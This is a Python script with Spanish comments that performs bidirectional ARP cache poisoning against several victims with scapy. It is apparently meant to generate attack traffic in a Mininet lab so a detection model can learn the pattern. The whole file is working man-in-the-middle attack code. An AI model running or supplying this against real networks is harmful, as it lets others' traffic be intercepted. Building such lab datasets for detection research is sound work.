#!/usr/bin/env python3
"""
arp_spoof.py
------------
Envía respuestas ARP falsificadas de forma continua para simular un
ataque de ARP spoofing dentro del laboratorio Mininet.

Ejecución:
    python3 arp_spoof.py <ip_a_suplantar> <mac_atacante> <victima1> [victima2 ...]

Envenena la caché ARP de UNA O VARIAS víctimas haciéndoles creer que
'ip_a_suplantar' está en la MAC del atacante. El ARP spoofing real rara
vez ataca a una sola víctima: lo habitual es envenenar a varios hosts a
la vez (o a toda la subred) para interceptar su tráfico. Soportar varias
víctimas, además de ser más realista, genera bastantes más flujos
capturables -antes una fase de spoofing dejaba apenas 1-3 flujos en toda
la red, demasiado poco para que el modelo aprendiera el patrón-.

Se detiene con Ctrl+C o al recibir SIGTERM.
"""
import sys
import time
from scapy.all import ARP, send


def main():
    if len(sys.argv) < 4:
        print("Uso: arp_spoof.py <ip_a_suplantar> <mac_atacante> "
              "<victima1> [victima2 ...]")
        sys.exit(1)

    spoofed_ip = sys.argv[1]
    attacker_mac = sys.argv[2]
    victims = sys.argv[3:]

    def send_fake_arp(target_ip, impersonated_ip):
        # op=2 -> respuesta ARP ("is-at"): le decimos a target_ip que
        # impersonated_ip esta en la MAC del atacante. Es una respuesta
        # que nadie ha pedido (ARP gratuito), la firma del ataque.
        pkt = ARP(op=2, pdst=target_ip, hwsrc=attacker_mac, psrc=impersonated_ip)
        send(pkt, verbose=False)

    try:
        while True:
            for victim_ip in victims:
                # Envenenar en ambos sentidos: la victima cree que la IP
                # suplantada esta en la MAC del atacante, y el host
                # suplantado cree lo mismo de la victima -asi el atacante
                # se coloca en medio de la comunicacion entre ambos-.
                send_fake_arp(victim_ip, spoofed_ip)
                send_fake_arp(spoofed_ip, victim_ip)
            time.sleep(1)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
